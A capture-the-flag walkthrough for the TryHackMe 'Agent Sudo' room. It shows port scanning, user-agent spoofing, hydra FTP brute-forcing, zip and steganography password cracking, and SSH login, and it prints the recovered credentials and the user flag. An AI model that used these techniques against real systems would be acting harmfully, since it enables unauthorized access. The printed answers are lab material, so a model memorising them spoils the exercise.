https://tryhackme.com/room/agentsudoctf

## Task 1

no answer required

## Task 2

### How many open ports?

```
kali@kali:~/Downloads$ sudo masscan -e tun0 -p1-65535,U:1-65535 10.10.164.129 --rate=1000
[sudo] password for kali: 

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-07-26 15:04:13 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.164.129                                   
Discovered open port 80/tcp on 10.10.164.129                                   
Discovered open port 22/tcp on 10.10.164.129   
```
answer

```
3
```

### How you redirect yourself to a secret page?

we get this message after nagivating to the web page

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

user-agent is an option we can set using curl

```
kali@kali:~$ curl -A "R" -L 10.10.206.40
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```

answer
```
user-agent
```

### What is the agent name?

we get this message when we set -A to "C"

```
kali@kali:~$ curl -A "C" -L 10.10.206.40
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

answer
```
chris
```

## Task 3

### FTP password

lets crack chris' FTP password using hydra

```
kali@kali:~$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.206.40 -t 4 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 00:10:39
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.206.40:21/
[STATUS] 60.00 tries/min, 60 tries in 00:01h, 14344339 to do in 3984:33h, 4 active
[STATUS] 57.33 tries/min, 172 tries in 00:03h, 14344227 to do in 4169:51h, 4 active
[21][ftp] host: 10.10.206.40   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-27 00:15:12

```

answer

```
crystal
```

### Zip file password

login to ftp with the creds above to download the files

there was an issue using ftp
```
kali@kali:~/Downloads/agents$ ftp 10.10.165.113 
Connected to 10.10.165.113.
220 (vsFTPd 3.0.3)
Name (10.10.165.113:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
500 Illegal PORT command.
ftp: bind: Address already in use
ftp> 
```

i used filezilla to download the files instead

```
cute-alien.jpg
cutie.png
To_agentJ.txt
```
the question metions a zip file password but we don't have a zip file here, lets check if there is a zip file hidden in one of the images

```
kali@kali:~/Downloads$ binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

kali@kali:~/Downloads$ binwalk cutie.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

kali@kali:~/Downloads$ ls
```

we find a zip file and extract it from the image

crack the password using john

```
kali@kali:~/Downloads/_cutie.png.extracted$ /usr/sbin/zip2john 8702.zip > output
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
kali@kali:~/Downloads/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  output  To_agentR.txt
kali@kali:~/Downloads/_cutie.png.extracted$ sudo john output
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:01:43 DONE 2/3 (2020-07-27 02:44) 0.009676g/s 425.6p/s 425.6c/s 425.6C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

answer 

```
alien
```

### steg password

unzip the file to get the password

```
QXJlYTUx
```

this password doesn't work, but it looks like base64, lets decode it

answer

```
Area51
```


### Who is the other agent (in full name)?

now extract the message with steghide
```
kali@kali:~/Downloads$ steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
kali@kali:~/Downloads$ ls
cute-alien.jpg  cute-alien.jpg.out  cutie.png  _cutie.png.extracted  message.txt  pass.txt  To_agentJ.txt
kali@kali:~/Downloads$ cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

answer
```
james
```

### SSH password

answer 
```
hackerrules!
```

## Task 4

### What is the user flag?

```
kali@kali:~/Downloads$ ssh james@10.10.165.113
james@10.10.165.113's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 27 06:53:46 UTC 2020

  System load:  0.0               Processes:           93
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 38%               IP address for eth0: 10.10.165.113
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```
answer

```
b03d975e8c92a7c04146cfa7a5a313c7
```

### What is the incident of the photo called?

download the jpg 

```
scp james@10.10.165.113:Alien_autospy.jpg /home/kali/Downloads
```

reverse img google search with "fox news"

answer

```
Roswell alien autopsy
```
